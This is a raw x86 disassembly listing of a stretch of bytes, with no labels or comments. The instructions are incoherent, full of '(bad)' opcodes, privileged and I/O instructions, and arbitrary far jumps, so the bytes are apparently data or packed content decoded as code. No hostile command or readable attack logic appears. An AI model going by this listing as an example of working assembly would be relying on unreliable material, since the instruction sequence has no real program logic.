  48e0b7:	adc    DWORD PTR [edi+0x7c],0xffffff96
  48e0bb:	mov    WORD PTR [edi+0x6befc793],?
  48e0c1:	jb     0x48e0e5
  48e0c3:	std    
  48e0c4:	inc    eax
  48e0c5:	mov    ebx,0x64838964
  48e0ca:	pushf  
  48e0cb:	push   edx
  48e0cc:	ror    BYTE PTR [edi+0x61],0x1
  48e0d0:	xchg   edi,eax
  48e0d1:	mov    edi,0x73af1bc0
  48e0d6:	jno    0x48e0db
  48e0d8:	fsubr  DWORD PTR [esi-0x4b]
  48e0db:	lods   eax,DWORD PTR ds:[esi]
  48e0dc:	push   ebp
  48e0dd:	dec    ebp
  48e0de:	xlat   BYTE PTR ds:[ebx]
  48e0df:	inc    ecx
  48e0e0:	shl    esp,1
  48e0e2:	mov    eax,ds:0xce1b0caa
  48e0e7:	nop
  48e0e8:	inc    esp
  48e0e9:	xchg   ecx,eax
  48e0ea:	xlat   BYTE PTR ds:[ebx]
  48e0eb:	mov    ebx,0xb39b56e4
  48e0f0:	test   eax,0x618e493c
  48e0f5:	or     eax,0x85ac415b
  48e0fa:	stos   DWORD PTR es:[edi],eax
  48e0fb:	icebp  
  48e0fc:	jmp    0x48e116
  48e0fe:	sub    ecx,DWORD PTR [ecx+edi*2+0x38]
  48e102:	mov    ecx,DWORD PTR [ebp+0x1b7c97b3]
  48e108:	inc    eax
  48e109:	add    eax,0x10c519f0
  48e10e:	dec    esp
  48e10f:	sbb    eax,0xe6b7a6e9
  48e114:	mov    al,ds:0x246d35b
  48e119:	jns    0x48e0f0
  48e11b:	nop
  48e11c:	add    ebx,DWORD PTR [eax+0x5e]
  48e11f:	jo     0x48e0c8
  48e121:	push   esi
  48e122:	push   edi
  48e123:	nop
  48e124:	or     eax,0x270239e
  48e129:	dec    ecx
  48e12a:	test   eax,0xea699129
  48e12f:	add    al,0xe9
  48e131:	pop    ebp
  48e132:	sbb    BYTE PTR [ebx+0x69],al
  48e135:	popf   
  48e136:	push   edx
  48e137:	xor    BYTE PTR [edx],al
  48e139:	or     bl,BYTE PTR [edi+0x24f2c61f]
  48e13f:	sub    eax,0x6960ad9c
  48e144:	push   eax
  48e145:	push   eax
  48e146:	jae    0x48e164
  48e148:	sub    esi,ebp
  48e14a:	in     al,dx
  48e14b:	icebp  
  48e14c:	hlt    
  48e14d:	add    cl,BYTE PTR [edx]
  48e14f:	int    0x3a
  48e151:	cs inc ebx
  48e153:	mov    ebx,0xdaf735a2
  48e158:	inc    ecx
  48e159:	nop
  48e15a:	retf   
  48e15b:	xchg   ecx,eax
  48e15c:	push   esp
  48e15d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48e15e:	(bad)  
  48e160:	test   al,0xf3
  48e162:	adc    BYTE PTR [ecx],bl
  48e164:	pop    ss
  48e165:	jb     0x48e1ab
  48e167:	adc    cl,BYTE PTR [esi]
  48e169:	mov    ah,0xa8
  48e16b:	icebp  
  48e16c:	daa    
  48e16d:	or     BYTE PTR [esi+esi*4+0x2080c190],bl
  48e174:	cmc    
  48e175:	push   cs
  48e176:	add    cl,BYTE PTR [edi+eiz*1+0x1a261bca]
  48e17d:	sub    eax,DWORD PTR [ebx+ebp*2]
  48e180:	jge    0x48e107
  48e182:	ror    BYTE PTR [edx],cl
  48e184:	aam    0xf6
  48e186:	das    
  48e187:	pop    edx
  48e188:	push   0x3e6984a2
  48e18d:	sub    al,0x68
  48e18f:	ins    BYTE PTR es:[edi],dx
  48e190:	aam    0x15
  48e192:	pop    edx
  48e193:	ja     0x48e18b
  48e195:	sub    cl,0xdc
  48e198:	adc    BYTE PTR [eax+0x37146b88],dh
  48e19e:	sub    cl,BYTE PTR [ebp+0x2d]
  48e1a1:	cs aaa 
  48e1a3:	sub    eax,eax
  48e1a5:	repz (bad) 
  48e1a7:	cmp    eax,DWORD PTR [edx-0x40846af1]
  48e1ad:	mov    ah,0xdb
  48e1af:	sub    DWORD PTR [edi+0x6c5e8385],0x7e3b7a48
  48e1b9:	add    al,0xb3
  48e1bb:	mov    eax,DWORD PTR [ebx+0x57575c0]
  48e1c1:	fs stc 
  48e1c3:	add    al,0xb6
  48e1c5:	scas   al,BYTE PTR es:[edi]
  48e1c6:	rcl    eax,0x98
  48e1c9:	jo     0x48e219
  48e1cb:	scas   eax,DWORD PTR es:[edi]
  48e1cc:	xchg   BYTE PTR [edi],cl
  48e1ce:	push   esi
  48e1cf:	push   0xf71c6e8f
  48e1d4:	test   ch,0x3b
  48e1d7:	sub    al,0xf7
  48e1d9:	inc    edi
  48e1da:	in     eax,dx
  48e1db:	jmp    0x48e210
  48e1dd:	cmp    esi,DWORD PTR [edi+0x39a4df9f]
  48e1e3:	nop
  48e1e4:	jbe    0x48e256
  48e1e6:	and    BYTE PTR [eax+0x48],bl
  48e1e9:	pusha  
  48e1ea:	ror    DWORD PTR [ebx+0x9],0xe
  48e1ee:	and    al,0x4
  48e1f0:	iret   
  48e1f1:	(bad)  
  48e1f3:	adc    edi,0x1887ee82
  48e1f9:	jge    0x48e258
  48e1fb:	retf   0x5a91
  48e1fe:	daa    
  48e1ff:	pop    ss
  48e200:	outs   dx,DWORD PTR ds:[esi]
  48e201:	lods   eax,DWORD PTR ds:[esi]
  48e202:	leave  
  48e203:	push   edi
  48e204:	imul   eax,ecx,0x93449574
  48e20a:	fsub   st(6),st
  48e20c:	xor    DWORD PTR [ecx],ecx
  48e20e:	push   0x706c156e
  48e213:	or     bl,al
  48e215:	adc    DWORD PTR [esi],0xbc87db65
  48e21b:	sub    eax,0x2dfb0da1
  48e220:	jne    0x48e232
  48e222:	or     ch,BYTE PTR [ebx+ebp*8]
  48e225:	retf   
  48e226:	xor    BYTE PTR [edi],dl
  48e228:	popa   
  48e229:	xor    al,0x47
  48e22b:	mov    ecx,0x75e84824
  48e230:	dec    eax
  48e231:	leave  
  48e232:	loopne 0x48e1be
  48e234:	mov    esp,0x1febab7c
  48e239:	jo     0x48e1c9
  48e23b:	dec    esp
  48e23c:	mov    eax,0xe78b5fa7
  48e241:	adc    BYTE PTR [ebx+eax*2+0x39],dh
  48e245:	push   edi
  48e246:	pop    ebp
  48e247:	pop    eax
  48e248:	jo     0x48e27c
  48e24a:	and    BYTE PTR [ebp-0x78],bh
  48e24d:	das    
  48e24e:	or     BYTE PTR [edx],0x1
  48e251:	mov    fs,WORD PTR [edi]
  48e253:	push   eax
  48e254:	jg     0x48e1eb
  48e256:	fcomp  DWORD PTR [ecx-0x26]
  48e259:	jmp    0xbe684ace
  48e25e:	shl    bh,1
  48e260:	daa    
  48e261:	dec    edx
  48e262:	popa   
  48e263:	mov    bl,0x1d
  48e265:	fmul   DWORD PTR [ecx-0x15]
  48e268:	pushf  
  48e269:	inc    ecx
  48e26a:	pop    ds
  48e26b:	cmp    eax,0xa0864b95
  48e270:	adc    al,0x93
  48e272:	mov    al,ds:0xf3ed04bf
  48e277:	cmp    esi,eax
  48e279:	loope  0x48e22e
  48e27b:	add    eax,esi
  48e27d:	jge    0x48e2a1
  48e27f:	aaa    
  48e280:	and    eax,DWORD PTR [ecx]
  48e282:	cmp    al,0x88
  48e284:	jo     0x48e2dc
  48e286:	xor    eax,0x5f775782
  48e28b:	and    BYTE PTR [edi],dh
  48e28d:	push   ds
  48e28e:	and    edi,DWORD PTR [ebx-0x9]
  48e291:	sahf   
  48e292:	repnz cmp eax,0x68155650
  48e298:	not    ebp
  48e29a:	sbb    eax,0x31c94c84
  48e29f:	pop    ebp
  48e2a0:	or     BYTE PTR [edx+ebp*1+0x24],ch
  48e2a4:	bswap  eax
  48e2a6:	ins    BYTE PTR es:[edi],dx
  48e2a7:	and    BYTE PTR [esi+eax*2+0x2a],dh
  48e2ab:	mov    ah,0x54
  48e2ad:	inc    eax
  48e2ae:	in     eax,dx
  48e2af:	inc    ebp
  48e2b0:	adc    BYTE PTR [edx+0x31ff4055],al
  48e2b6:	outs   dx,DWORD PTR ds:[esi]
  48e2b7:	es xor eax,0xbbd0bfa6
  48e2bd:	jl     0x48e2ec
  48e2bf:	icebp  
  48e2c0:	rcr    BYTE PTR [edx],cl
  48e2c2:	xchg   edx,eax
  48e2c3:	ins    BYTE PTR es:[edi],dx
  48e2c4:	rol    dh,0x15
  48e2c7:	adc    BYTE PTR [ecx-0x51],0xc
  48e2cb:	jl     0x48e2bb
  48e2cd:	mov    BYTE PTR [eax-0x4edb6c68],dl
  48e2d3:	xor    BYTE PTR [eax+0x2b09d34f],bh
  48e2d9:	and    edx,edx
  48e2db:	xchg   ebx,eax
  48e2dc:	(bad)  
  48e2dd:	popa   
  48e2de:	sub    BYTE PTR [ebx+0x3d],dh
  48e2e1:	xor    BYTE PTR [eax+0x7b6853ba],dl
  48e2e7:	xchg   esi,eax
  48e2e8:	rcr    DWORD PTR [ebx-0x4d],cl
  48e2eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48e2ec:	or     edi,DWORD PTR [edx-0x9]
  48e2ef:	inc    eax
  48e2f0:	outs   dx,BYTE PTR ds:[esi]
  48e2f1:	arpl   WORD PTR [edi],cx
  48e2f3:	loope  0x48e32c
  48e2f5:	pushf  
  48e2f6:	adc    DWORD PTR [eax-0x78],ebp
  48e2f9:	(bad)  
  48e2fa:	push   es
  48e2fb:	enter  0xff70,0x8a
  48e2ff:	dec    ebx
  48e300:	pop    esi
  48e301:	xor    cl,0x1
  48e304:	mov    edx,0x4bcf7bf4
  48e309:	dec    esi
  48e30a:	shr    dh,cl
  48e30c:	push   esp
  48e30d:	cmp    ch,BYTE PTR cs:[esp+ecx*1-0x6a]
  48e312:	enter  0x8a86,0xc2
  48e316:	xor    al,0x96
  48e318:	int    0x20
  48e31a:	das    
  48e31b:	fadd   st,st(4)
  48e31d:	data16 fcmovnbe st,st(5)
  48e320:	adc    eax,0xcf518808
  48e325:	shr    DWORD PTR [ebx],cl
  48e327:	or     ch,cl
  48e329:	mov    al,0x37
  48e32b:	out    dx,al
  48e32c:	xchg   ecx,eax
  48e32d:	and    DWORD PTR [ecx+ebx*1],ebx
  48e330:	xchg   DWORD PTR [edi],ecx
  48e332:	test   DWORD PTR [ebx+0x3812e411],edx
  48e338:	add    eax,DWORD PTR [esp+ebp*8]
  48e33b:	mov    al,ds:0xb82257f9
  48e340:	mov    esp,0xf710a312
  48e345:	and    BYTE PTR ds:0x403f4642,dl
  48e34b:	gs loope 0x48e362
  48e34e:	add    al,0x70
  48e350:	pop    ss
  48e351:	(bad)  
  48e353:	mov    ds:0x882de98f,al
  48e358:	pusha  
  48e359:	addr16 aaa 
  48e35b:	sbb    edi,0x42
  48e35e:	jb     0x48e2fa
  48e360:	inc    esp
  48e361:	xor    DWORD PTR [esi-0x593b451c],edx
  48e367:	dec    ebx
  48e368:	xor    ch,BYTE PTR [edi+0x4a]
  48e36b:	xor    BYTE PTR [si+0xd06],dh
  48e370:	inc    edx
  48e371:	iret   
  48e372:	mov    edi,0x826fd45
  48e377:	jns    0x48e399
  48e379:	and    eax,DWORD PTR [edi+0x1ae830a4]
  48e37f:	stos   DWORD PTR es:[edi],eax
  48e380:	icebp  
  48e381:	and    al,ch
  48e383:	cmp    BYTE PTR [edx+0x61],bl
  48e386:	dec    esp
  48e387:	xlat   BYTE PTR ds:[ebx]
  48e388:	add    DWORD PTR [ecx-0x51],ebx
  48e38b:	dec    esp
  48e38c:	test   BYTE PTR [esi],0xa6
  48e38f:	mov    al,ds:0x507c218e
  48e394:	imul   ebx,DWORD PTR [eax-0x7f4f9f21],0xffffffc5
  48e39b:	imul   ebx,DWORD PTR ds:0x8424b190,0x42
  48e3a2:	mov    edi,0xc23f0bc1
  48e3a7:	dec    ebx
  48e3a8:	ret    
  48e3a9:	std    
  48e3aa:	aas    
  48e3ab:	cmp    BYTE PTR [ebx-0x2beecc0c],0xf2
  48e3b2:	mov    ah,0x95
  48e3b4:	stos   BYTE PTR es:[edi],al
  48e3b5:	mov    al,0x45
  48e3b7:	or     DWORD PTR [edi],edx
  48e3b9:	mov    al,ds:0xa89780d4
  48e3be:	mov    ch,0x51
  48e3c0:	(bad)  
  48e3c1:	sbb    eax,0x1161827
  48e3c6:	adc    bl,0x7
  48e3c9:	xchg   DWORD PTR [esi+0x70],esi
  48e3cc:	cmp    eax,0x9794b487
  48e3d1:	cmp    BYTE PTR [eax+0x7ce8113],0xfa
  48e3d8:	sbb    ecx,DWORD PTR [ebx+0x7a83aa90]
  48e3de:	adc    BYTE PTR ds:0xa941530c,al
  48e3e4:	add    DWORD PTR [ebx],0xffffff90
  48e3e7:	ja     0x48e3fa
  48e3e9:	push   esi
  48e3ea:	mov    dl,0x71
  48e3ec:	clc    
  48e3ed:	xor    eax,0xca0d7889
  48e3f2:	pop    es
  48e3f3:	sbb    BYTE PTR [ebx+eax*1],ch
  48e3f6:	fiadd  DWORD PTR [edx-0x7c04b5e5]
  48e3fc:	xchg   ebx,eax
  48e3fd:	and    BYTE PTR [edi-0x615052b3],ch
  48e403:	xchg   edx,eax
  48e404:	add    ah,ch
  48e406:	test   DWORD PTR [ebp-0x6fd46bd0],ecx
  48e40c:	add    bl,BYTE PTR [edi-0x61]
  48e40f:	xchg   ebx,eax
  48e410:	cmp    al,0x86
  48e412:	outs   dx,BYTE PTR ds:[esi]
  48e413:	mov    dl,0x2
  48e415:	mov    ah,0x2
  48e417:	mov    al,0x2
  48e419:	in     al,0x32
  48e41b:	mov    al,0x25
  48e41d:	aas    
  48e41e:	int3   
  48e41f:	enter  0xa188,0x60
  48e423:	(bad)
  48e426:	arpl   WORD PTR [ecx-0x35],dx
  48e429:	sbb    bl,BYTE PTR [eax]
  48e42b:	adc    eax,DWORD PTR [eax+0xb037a73]
  48e431:	cmp    al,0x50
  48e433:	cmp    DWORD PTR [ebx-0x3b443124],0x5e
  48e43a:	nop
  48e43b:	stos   DWORD PTR es:[edi],eax
  48e43c:	lock cmp eax,0x49585869
  48e442:	jge    0x48e4a5
  48e444:	add    DWORD PTR [eax+0x46],esi
  48e447:	or     al,0x3
  48e449:	test   BYTE PTR [edi+esi*1+0x481200cd],dh
  48e450:	or     BYTE PTR [ebx],al
  48e452:	push   es
  48e453:	push   eax
  48e454:	mov    ds:0x9463810e,eax
  48e459:	push   edi
  48e45a:	gs aas 
  48e45c:	or     BYTE PTR [eax],cl
  48e45e:	les    eax,FWORD PTR [eax]
  48e460:	(bad)  
  48e461:	or     edx,edx
  48e463:	mov    dh,0x5d
  48e465:	sbb    DWORD PTR [ecx+0x64],eax
  48e468:	cmp    ebx,esi
  48e46a:	sub    DWORD PTR gs:[eax],esp
  48e46d:	jecxz  0x48e43a
  48e46f:	ret    0x25f5
  48e472:	imul   ebp,DWORD PTR [esi+0x33f8360a],0xfc9bc084
  48e47c:	adc    ah,BYTE PTR [ecx]
  48e47e:	icebp  
  48e47f:	jl     0x48e458
  48e481:	cmp    DWORD PTR [eax+eiz*8],eax
  48e484:	retf   
  48e485:	push   ecx
  48e486:	int    0x2
  48e488:	pop    eax
  48e489:	and    eax,0x3aafd5ac
  48e48e:	cwde   
  48e48f:	sbb    al,0x4e
  48e491:	loope  0x48e508
  48e493:	adc    al,0x87
  48e495:	or     cl,BYTE PTR [ecx]
  48e497:	cmp    cl,al
  48e499:	mov    ebx,0x93990ffd
  48e49e:	aam    0xdf
  48e4a0:	hlt    
  48e4a1:	add    al,0x24
  48e4a3:	add    BYTE PTR [esi],cl
  48e4a5:	es push ecx
  48e4a7:	imul   edx,DWORD PTR [eax],0x52
  48e4aa:	aaa    
  48e4ab:	mov    eax,0x57c5ad90
  48e4b0:	dec    eax
  48e4b1:	jmp    0x48e50b
  48e4b3:	mov    DWORD PTR [edx+0x68],esi
  48e4b6:	bound  esp,QWORD PTR [ebx]
  48e4b8:	sub    DWORD PTR [eax+0x66dc0d49],esp
  48e4be:	and    esp,DWORD PTR ds:0x260c0878
  48e4c4:	(bad)
  48e4c8:	arpl   WORD PTR [eax+0x1a1d6829],di
  48e4ce:	jmp    DWORD PTR [edi+0x3b]
  48e4d1:	je     0x48e4d6
  48e4d3:	inc    esp
  48e4d4:	addr16 add al,BYTE PTR [bp-0x2a]
  48e4d9:	dec    ecx
  48e4da:	shl    BYTE PTR [eax+edx*2-0x33a8c55e],0xf
  48e4e2:	xor    eax,0x4609bc05
  48e4e7:	mov    esp,0xc7ad91a
  48e4ec:	fisttp DWORD PTR [eax+0x39]
  48e4ef:	adc    BYTE PTR [esi],al
  48e4f1:	mov    edx,DWORD PTR [edx]
  48e4f3:	add    BYTE PTR [edi+0x5a8b5777],bl
  48e4f9:	or     edi,esp
  48e4fb:	lods   al,BYTE PTR ds:[esi]
  48e4fc:	sbb    DWORD PTR [ecx-0xed89f6d],ecx
  48e502:	add    edx,ebx
  48e504:	mov    al,ds:0x830ace7c
  48e509:	cmp    ah,al
  48e50b:	call   0xbd16d4d
  48e510:	int    0xf2
  48e512:	push   esp
  48e513:	scas   al,BYTE PTR es:[edi]
  48e514:	lea    esi,[ecx+0x6c5fd880]
  48e51a:	lods   al,BYTE PTR ds:[esi]
  48e51b:	and    cl,dh
  48e51d:	jae    0x48e4a0
  48e51f:	ror    BYTE PTR [eax],0x19
  48e522:	xchg   esp,eax
  48e523:	test   DWORD PTR [esi-0x31],edi
  48e526:	test   BYTE PTR [esi-0x7108be53],0xf8
  48e52d:	rol    DWORD PTR [eax+0x23ebef8e],cl
  48e533:	and    BYTE PTR [esi-0x78a102ef],0x81
  48e53a:	lahf   
  48e53b:	mov    dh,dh
  48e53d:	cmp    bl,BYTE PTR [esi+0x57]
  48e540:	mov    cl,0x11
  48e542:	lock xor al,0x34
  48e545:	fwait
  48e546:	xlat   BYTE PTR ds:[ebx]
  48e547:	mov    dl,0xa1
  48e549:	push   es
  48e54a:	push   cs
  48e54b:	jmp    FWORD PTR [edx+0x5b]
  48e54e:	dec    ebp
  48e54f:	fwait
  48e550:	mov    ah,0x76
  48e552:	xchg   BYTE PTR [ecx-0x64],ch
  48e555:	push   ecx
  48e556:	jne    0x48e57f
  48e558:	dec    eax
  48e559:	prefetcht0 BYTE PTR [esi]
  48e55c:	test   eax,0x4c811c81
  48e561:	fadd   QWORD PTR [eax]
  48e563:	push   esp
  48e564:	test   BYTE PTR ds:0x521258e3,dl
  48e56a:	(bad)  
  48e56b:	cdq    
  48e56c:	arpl   WORD PTR [edx-0x5fda20f3],bp
  48e572:	lods   al,BYTE PTR ds:[esi]
  48e573:	clc    
  48e574:	push   0x75a854eb
  48e579:	(bad)  
  48e57a:	(bad)  
  48e57b:	ja     0x48e517
  48e57d:	pop    edx
  48e57e:	jle    0x48e513
  48e580:	sti    
  48e581:	xor    al,0xdd
  48e583:	pop    esi
  48e584:	inc    esp
  48e585:	test   DWORD PTR [edx],ecx
  48e587:	pop    ecx
  48e588:	scas   eax,DWORD PTR es:[edi]
  48e589:	psraw  mm7,mm0
  48e58c:	or     dl,BYTE PTR [ecx]
  48e58e:	add    DWORD PTR [eax+0x138384fc],edx
  48e594:	sub    al,0x5c
  48e596:	mov    BYTE PTR [ebx+0x2f],ah
  48e599:	or     DWORD PTR [ebx-0x74cb56d4],0x4a
  48e5a0:	push   ebx
  48e5a1:	xchg   edi,eax
  48e5a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48e5a3:	pop    ss
  48e5a4:	adc    bh,BYTE PTR [eax+0x3f]
  48e5a7:	add    eax,eax
  48e5a9:	cli    
  48e5aa:	inc    esi
  48e5ab:	jg     0x48e5d0
  48e5ad:	adc    bh,BYTE PTR [eax+0x9]
  48e5b0:	xchg   ebp,eax
  48e5b1:	pop    esp
  48e5b2:	or     al,0xc2
  48e5b4:	cli    
  48e5b5:	shr    DWORD PTR [eax+ecx*8],cl
  48e5b8:	push   ss
  48e5b9:	fdiv   QWORD PTR [edx+0x29]
  48e5bc:	or     BYTE PTR [edx+0x51],cl
  48e5bf:	lds    edx,FWORD PTR [edi-0x1e]
  48e5c2:	pop    edx
  48e5c3:	dec    edx
  48e5c4:	or     al,0x4b
  48e5c6:	test   BYTE PTR [edx-0x71],bl
  48e5c9:	jle    0x48e54c
  48e5cb:	jmp    0xb4fd:0xfc419a1a
  48e5d2:	push   eax
  48e5d3:	mov    ds:0x277f744a,eax
  48e5d8:	cmp    BYTE PTR ds:0x9ff49a90,0xed
  48e5df:	lock jp 0x48e5ad
  48e5e2:	add    edi,DWORD PTR [ebx]
  48e5e4:	pop    es
  48e5e5:	jne    0xd19e9a3
  48e5eb:	mov    ?,WORD PTR [esi+ebp*2]
  48e5ee:	stos   DWORD PTR es:[edi],eax
  48e5ef:	sbb    cl,bh
  48e5f1:	test   DWORD PTR [ebx],esp
  48e5f3:	adc    ebx,DWORD PTR [edi+0x1d7502f0]
  48e5f9:	aas    
  48e5fa:	xchg   esp,eax
  48e5fb:	mov    WORD PTR [esi+0x2ab08094],gs
  48e601:	pop    ss
  48e602:	mov    ebx,DWORD PTR [ecx]
  48e604:	ret    0xa67c
  48e607:	adc    esp,ecx
  48e609:	and    BYTE PTR [edx],bh
  48e60b:	or     al,0x3b
  48e60d:	scas   eax,DWORD PTR es:[edi]
  48e60e:	out    dx,al
  48e60f:	pop    ebx
  48e610:	fwait
  48e611:	inc    esp
  48e612:	xor    eax,0x57965fc6
  48e617:	push   eax
  48e618:	pop    ecx
  48e619:	gs inc edi
  48e61b:	je     0x48e610
  48e61d:	idiv   BYTE PTR [edi]
  48e61f:	mov    al,ds:0x1e74400
  48e624:	jmp    0xb1bf2b4b
  48e629:	inc    ecx
  48e62a:	in     al,dx
  48e62b:	add    BYTE PTR ds:0xb3239064,ah
  48e631:	test   al,0xfc
  48e633:	cmp    al,0x83
  48e635:	sti    
  48e636:	add    al,0xa0
  48e638:	inc    esp
  48e639:	or     BYTE PTR [eax+0x7ae88544],ah
  48e63f:	(bad)  
  48e641:	push   ebx
  48e642:	and    DWORD PTR [eax],esi
  48e644:	adc    dh,dl
  48e646:	js     0x48e6b8
  48e648:	ins    BYTE PTR es:[edi],dx
  48e649:	mov    ss,WORD PTR [ebx]
  48e64b:	test   DWORD PTR [ebx],ebp
  48e64d:	add    eax,0xfffffff6
  48e650:	mov    eax,ds:0x48ac07a0
  48e655:	sbb    BYTE PTR [edx],al
  48e657:	inc    ecx
  48e658:	and    BYTE PTR [eax],0xad
  48e65b:	imul   esp,DWORD PTR [edx+0x1],0x66be6a02
  48e662:	lahf   
  48e663:	rol    dh,cl
  48e665:	lea    ebp,[eax]
  48e667:	test   eax,0x43e90161
  48e66c:	test   BYTE PTR [eax+0x4b1b361b],dl
  48e672:	and    eax,0x64e8a696
  48e677:	mov    edx,eax
  48e679:	dec    eax
  48e67a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48e67b:	add    eax,0x1f7bbdb0
  48e680:	cmp    al,0x50
  48e682:	or     BYTE PTR [ebx+0x48],ah
  48e685:	mov    ah,0x4e
  48e687:	xchg   edi,eax
  48e688:	add    BYTE PTR [ebp+0x5b],ah
  48e68b:	add    dh,BYTE PTR [edx-0x38]
  48e68e:	out    0x62,eax
  48e690:	cmp    esi,esp
  48e692:	dec    ebp
  48e693:	sahf   
  48e694:	in     al,dx
  48e695:	mov    ah,0x6
  48e697:	ror    BYTE PTR [ebp-0x8],cl
  48e69a:	cmp    DWORD PTR [eax],esi
  48e69c:	rcr    DWORD PTR [edx+0x62],1
  48e69f:	jns    0x48e6db
  48e6a1:	hlt    
  48e6a2:	loop   0x48e66a
  48e6a4:	sbb    DWORD PTR [ecx],ebx
  48e6a6:	mov    ecx,0xececf437
  48e6ab:	push   ds
  48e6ac:	mov    esi,ss
  48e6ae:	or     DWORD PTR [eax-0x6961c8cb],eax
  48e6b4:	push   ebx
  48e6b5:	sub    bl,BYTE PTR [ebx-0x7d]
  48e6b8:	not    BYTE PTR [ebp-0x26]
  48e6bb:	les    eax,FWORD PTR [edi-0x74]
  48e6be:	xor    eax,0xc8449ffa
  48e6c3:	add    DWORD PTR [esi+0x187311a3],0x3e
  48e6ca:	hlt    
  48e6cb:	nop
  48e6cc:	add    DWORD PTR [edx+0x41],edi
  48e6cf:	ror    BYTE PTR [ebp-0x80],1
  48e6d2:	pop    ds
  48e6d3:	push   esi
  48e6d4:	out    dx,eax
  48e6d5:	arpl   WORD PTR [ecx],ax
  48e6d7:	mov    ds:0x93835475,eax
  48e6dc:	lock sbb BYTE PTR [edx+0x7be4ac37],dl
  48e6e3:	lahf   
  48e6e4:	sub    eax,0xb4859f54
  48e6e9:	and    DWORD PTR [ecx-0x10],0x27
  48e6ed:	aaa    
  48e6ee:	xor    edx,DWORD PTR [ecx+0x50]
  48e6f1:	mov    al,BYTE PTR [ecx+0x54]
  48e6f4:	and    DWORD PTR [ebx-0x4b07852f],eax
  48e6fa:	lea    ecx,[esi+0xc]
  48e6fd:	adc    eax,DWORD PTR [edi]
  48e6ff:	xor    eax,0x3ec3535a
  48e704:	lahf   
  48e705:	adc    esi,eax
  48e707:	pop    es
  48e708:	xor    DWORD PTR [esp+eiz*8+0x475b0c61],ebp
  48e70f:	popf   
  48e710:	loopne 0x48e712
  48e712:	jne    0x48e704
  48e714:	stc    
  48e715:	cmp    eax,DWORD PTR ds:0xd744f492
  48e71b:	xor    BYTE PTR [esi+eiz*2],al
  48e71e:	jns    0x48e745
  48e720:	sbb    DWORD PTR [edx+0x2421f921],edx
  48e726:	xor    eax,0x92192c09
  48e72b:	and    DWORD PTR [eax],ecx
  48e72d:	cmp    eax,0x15e200c
  48e732:	sub    eax,0xc337703e
  48e737:	sbb    al,BYTE PTR ds:0xdcf1171
  48e73d:	ror    BYTE PTR [ebp+0x1a],cl
  48e740:	mov    ds:0x413f8,eax
  48e745:	jmp    0x48e6f8
  48e747:	jae    0x48e6da
  48e749:	adc    DWORD PTR [esi+0x54],esi
  48e74c:	sbb    DWORD PTR [edx+eax*1+0xe],esi
  48e750:	rcr    BYTE PTR [eax+0x65],cl
  48e753:	sub    eax,0x217a9b5
  48e758:	loop   0x48e766
  48e75a:	addr16 inc edi
  48e75c:	aaa    
  48e75d:	dec    ebx
  48e75e:	jb     0x48e767
  48e760:	call   0x2dd6:0x71309504
  48e767:	lods   eax,DWORD PTR ds:[esi]
  48e768:	inc    eax
  48e769:	bound  edx,QWORD PTR [ebx+0x7c]
  48e76c:	jecxz  0x48e78f
  48e76e:	push   es
  48e76f:	fimul  WORD PTR [ecx]
  48e771:	rsqrtps xmm3,XMMWORD PTR [edx+0xc007f0c]
  48e778:	cmp    DWORD PTR [eax],eax
  48e77a:	xchg   esi,eax
  48e77b:	mov    WORD PTR [eax+0x408a3a74],ss
  48e781:	cmovs  eax,DWORD PTR [ebx+eiz*4]
  48e785:	mov    dl,0x69
  48e787:	fistp  QWORD PTR [edx]
  48e789:	xor    eax,0xaf2b1a
  48e78e:	inc    ebp
  48e78f:	pop    ecx
  48e790:	pop    ds
  48e791:	or     ah,BYTE PTR [edi-0x6f115b30]
  48e797:	or     BYTE PTR [ecx+0x64],bl
  48e79a:	popf   
  48e79b:	(bad)  
  48e79c:	sub    ebx,DWORD PTR [ecx+0x5f5097f8]
  48e7a2:	pop    ebx
  48e7a3:	lahf   
  48e7a4:	sbb    eax,0x70924bff
  48e7a9:	inc    edx
  48e7aa:	push   ecx
  48e7ab:	das    
  48e7ac:	outs   dx,BYTE PTR ds:[esi]
  48e7ad:	push   ebx
  48e7ae:	push   ebp
  48e7af:	xchg   esp,eax
  48e7b0:	icebp  
  48e7b1:	loop   0x48e7ff
  48e7b3:	and    dl,BYTE PTR [ecx]
  48e7b5:	push   ds
  48e7b6:	pop    eax
  48e7b7:	rcl    DWORD PTR ds:0x70256ee0,1
  48e7bd:	popf   
  48e7be:	sbb    DWORD PTR ds:[esi+eiz*4-0x571a3e7c],0x4e
  48e7c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48e7c8:	in     al,dx
  48e7c9:	inc    edx
  48e7ca:	sti    
  48e7cb:	ss add eax,0x42a9a855
  48e7d1:	xchg   ebx,eax
  48e7d2:	push   cs
  48e7d3:	push   esi
  48e7d4:	leave  
  48e7d5:	dec    edx
  48e7d6:	and    eax,DWORD PTR ds:0xb694163
  48e7dc:	dec    ebx
  48e7dd:	mov    edi,0x78017b71
  48e7e2:	mov    eax,0x456a4b1e
  48e7e7:	or     DWORD PTR [ecx-0x70],ebx
  48e7ea:	(bad)  
  48e7eb:	arpl   WORD PTR [esi-0x5d682ecf],di
  48e7f1:	add    ch,al
  48e7f3:	loope  0x48e825
  48e7f5:	arpl   WORD PTR [edi+edx*1-0x40],ax
  48e7f9:	inc    esi
  48e7fa:	test   BYTE PTR [ebp-0x6fe6743d],0x38
  48e801:	and    DWORD PTR ds:0x6858b42c,eax
  48e807:	or     esi,DWORD PTR [edx+0x4a10353]
  48e80d:	adc    DWORD PTR [esi-0x5e],esp
  48e810:	pop    ecx
  48e811:	add    BYTE PTR [eax-0x78bd1f5d],al
  48e817:	pop    edx
  48e818:	mov    eax,edx
  48e81a:	imul   ebp,DWORD PTR [eax-0x32],0xc0a4188c
  48e821:	cmp    al,0xb3
  48e823:	xchg   ebp,eax
  48e824:	and    esi,ebp
  48e826:	or     dl,BYTE PTR [eax-0x4244d4a0]
  48e82c:	mov    edx,0xd9f7a84d
  48e831:	xchg   esi,eax
  48e832:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48e833:	neg    edx
  48e835:	in     eax,0x6
  48e837:	jns    0x48e840
  48e839:	jo     0x48e7f2
  48e83b:	push   ecx
  48e83c:	inc    ecx
  48e83d:	adc    BYTE PTR [esi+esi*4+0x46],dh
  48e841:	repnz loopne 0x48e80e
  48e844:	sbb    DWORD PTR [ebx],edx
  48e846:	lock pop eax
